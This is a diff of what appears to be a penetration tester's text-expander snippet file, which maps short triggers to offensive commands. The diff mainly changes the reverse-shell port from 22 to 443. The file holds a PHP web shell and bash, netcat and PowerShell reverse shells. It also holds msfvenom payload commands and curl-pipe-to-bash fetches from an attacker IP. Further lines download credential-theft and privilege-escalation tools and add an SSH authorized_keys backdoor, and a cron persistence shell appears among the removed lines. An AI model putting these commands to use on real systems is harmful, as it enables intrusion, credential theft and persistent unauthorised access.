@@ -25,13 +25,13 @@ matches:
     replace : |          
       mkdir -p net && cd net         
       echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
-      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > rev.php
-      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'" > shell.sh
-      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell86.elf &
-      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell64.elf &
-      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f exe -o shell86.exe &
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f exe -o shell64.exe &
-      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
+      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'\"); ?>" > rev.php
+      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'" > shell.sh
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf &
+      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
+      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
+      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
@@ -40,39 +40,38 @@ matches:
       wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
       wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
       wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
-      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
+      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit & 
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &                                                                 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &                                                                  
       sudo python3 -m http.server 80
 
   - trigger: ":msfwin"
-    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST=
+    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 -f exe -o shell.exe LHOST=
 
   - trigger: ":msfmwin"
-    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST=
+    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 -f exe -o shell.exe LHOST=
 
   - trigger: ":msflin"
-    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=22 -f elf -o shell.elf LHOST=
+    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=
 
   - trigger: ":msfmlin"
-    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=22 -f elf -o shell.elf LHOST=
+    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=
 
-  - trigger: ":smbserver"
+  - trigger: ":smb"
     replace: "impacket-smbserver -smb2support share ."
 
   - trigger: ":pyserver"
-    replace: "python3 -m http.sever "
+    replace: "python3 -m http.server "
   
   - trigger: ":phpserver"
-    replace: "php -S 0.0.0.0:"
+    replace: "php -S 0.0.0.0:"                                                  
                                                                                 
-  - trigger: ":responder"
-    replace: "sudo responder -I tun0"
-    
-  - trigger: ":nc"
-    replace: nc -nvlp 22
-
+  - trigger: ":responder"                                                       
+    replace: "sudo responder -I tun0"                                           
+                                                                                
+  - trigger: ":nc"                                                              
+    replace: nc -nvlp 443                                                                          
 # ENUMERATION
   - trigger: ":nmap"
     replace: sudo nmap -sC -sV -v -p- -o nmap --min-rate 
@@ -87,28 +86,22 @@ matches:
     replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u "
 
 # REVERSE SHELLS                                                                
-  # LINUX
-  - trigger: ":rbash"
-    replace: "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"
-
-  - trigger: ":rphp"
-    replace: <?php shell_exec("bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"); ?>
-  - trigger: ":wphp"
-    replace: <?php echo shell_exec($_GET['cmd']); ?>
-    
+  # LINUX                                                                       
   - trigger: ":rcurl"                                                           
-    replace: curl http://{{IP}}/shell.sh | bash
+    replace: curl http://{{IP}}/shell.sh | bash                                 
                                                                                 
   - trigger: ":rwget"                                                           
-    replace: wget http://192.168.174.150/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
+    replace: wget http://{{IP}}/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh                                                                        
+  - trigger: ":rbash"
+    replace: bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'
 
   - trigger: ":mkfifo"                                                          
-    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 22 >/tmp/f
+    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 443 >/tmp/f
     
   # WINDOWS
   - trigger: ":rpowershell"
     replace: |
-      $LHOST = "{{IP}}"; $LPORT = 22; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() 
+      $LHOST = "{{IP}}"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() 
 
 # POST
   - trigger: ":pty"
@@ -130,10 +123,7 @@ matches:
     replace: |
       mkdir -p ~/.ssh
       echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
-      
-  - trigger: ":cronpersist"
-    replace: crontab -l | { cat; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"; } | crontab -
-
+  
   - trigger: ":wget"
     replace: wget http://{{IP}}/
     
